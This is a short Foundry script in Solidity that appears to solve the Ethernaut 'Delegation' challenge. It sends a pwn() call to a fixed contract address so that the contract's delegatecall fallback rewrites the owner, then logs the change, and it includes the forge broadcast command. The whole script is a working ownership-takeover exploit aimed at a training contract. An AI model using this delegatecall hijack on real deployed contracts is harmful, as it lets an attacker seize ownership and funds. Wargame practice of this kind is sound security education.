// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance =
        Delegation(0xE30d8f86399B51D6c6c7038ff1Bc60305D323DFd);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        (bool success, ) = address(delegationInstance).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Failed to call Delegation contract");
        console.log("Owner after: ", delegationInstance.owner());
        vm.stopBroadcast();
    }
}
/* 
source .env
forge script script/Delegation.s.sol --broadcast --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
